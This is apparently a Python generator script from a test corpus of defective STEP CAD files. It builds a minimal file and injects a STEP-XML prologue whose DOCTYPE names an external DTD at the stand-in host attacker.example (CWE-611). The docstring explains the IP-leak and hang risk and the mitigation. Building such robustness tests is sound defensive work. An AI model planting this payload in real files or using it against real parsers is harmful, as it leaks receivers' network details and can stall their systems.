"""Ad108 — STEP-XML DOCTYPE references an external DTD over the network.

Catalog claim: ISO 10303-28 specifies an XML transfer of STEP data. The
DOCTYPE declaration may name an external DTD via a SYSTEM identifier
(<!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd">); a receiver
whose XML parser resolves external DTDs by default fetches the URL on every
load. The fetched DTD can declare further external entities, redirect, or
simply hang. Even without entity expansion this leaks the receiver's IP /
load timing to the URL owner, and on slow networks blocks the load
indefinitely.

Reproducer recipe: a .stpx file beginning
<?xml version="1.0"?> <!DOCTYPE step SYSTEM "http://attacker.example/evil.dtd">
<step ..>..</step>; the DTD URL is unreachable / slow / hostile.

Byte assertions:
  contains(b'<!DOCTYPE') and contains(b'SYSTEM')
  contains(b'http://') or contains(b'evil.dtd')

Tier-3: load == "ok"
Expected: occt=empty/empty gmsh=empty ifc=schema_n/a
"""
from step_corpus.step_builder import StepFile

f = StepFile(
    catalog_id="Ad108",
    defect=(
        "STEP-XML DOCTYPE references external DTD via SYSTEM identifier; "
        "<!DOCTYPE step SYSTEM 'http://attacker.example/evil.dtd'> causes "
        "receiver's XML parser to fetch the URL on every load; "
        "fetched DTD may declare further entities, redirect, or block indefinitely; "
        "leaks receiver IP and load timing to the URL owner; "
        "receiver must disable external-DTD resolution by default; "
        "must reject documents whose DOCTYPE names an external SYSTEM identifier; "
        "CWE-611; ISO 10303-28 STEP-XML transfer; "
        "GEOMETRIC_CURVE_SET IS model entity — OCC yields empty"
    ),
)

# Minimal geometry: a single point wrapped in GEOMETRIC_CURVE_SET so that
# OCC yields empty (shape_null == True).
origin = f.cartesian_point((0.0, 0.0, 0.0))
gcs = f._emit_raw(f"GEOMETRIC_CURVE_SET('',(#{origin.eid}))")
f.add_product_chain(gcs)

# Attack payload: inject the external-DTD DOCTYPE prologue as a comment block
# immediately after the ISO-10303-21; line.
#
# Satisfies:
#   contains(b'<!DOCTYPE') and contains(b'SYSTEM')  — external DTD declaration
#   contains(b'http://') or contains(b'evil.dtd')   — hostile URL

_original_render = f.render


def _render_with_external_dtd_payload():
    text = _original_render()
    external_dtd_comment = (
        "/* External-DTD attack payload (STEP-XML / ISO 10303-28 wrapper layer):\n"
        "   <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "   <!DOCTYPE step SYSTEM \"http://attacker.example/evil.dtd\">\n"
        "   <step:iso_10303_28 xmlns:step=\"urn:oid:1.0.10303.28.3.1\">\n"
        "     <step:header/>\n"
        "     <step:data/>\n"
        "   </step:iso_10303_28>\n"
        "   Receiver must disable external-DTD resolution by default (CWE-611).\n"
        "   DOCTYPE SYSTEM URL: http://attacker.example/evil.dtd\n"
        "   On every load the vulnerable parser fetches this URL, leaking\n"
        "   the receiver's IP to the attacker and blocking on slow networks.\n"
        "*/\n"
    )
    marker = "ISO-10303-21;\n"
    idx = text.index(marker) + len(marker)
    return text[:idx] + external_dtd_comment + text[idx:]


f.render = _render_with_external_dtd_payload  # type: ignore[method-assign]
